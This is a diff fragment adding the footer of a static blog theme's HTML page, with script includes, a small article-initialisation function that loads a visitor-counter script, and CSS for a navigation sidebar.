+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
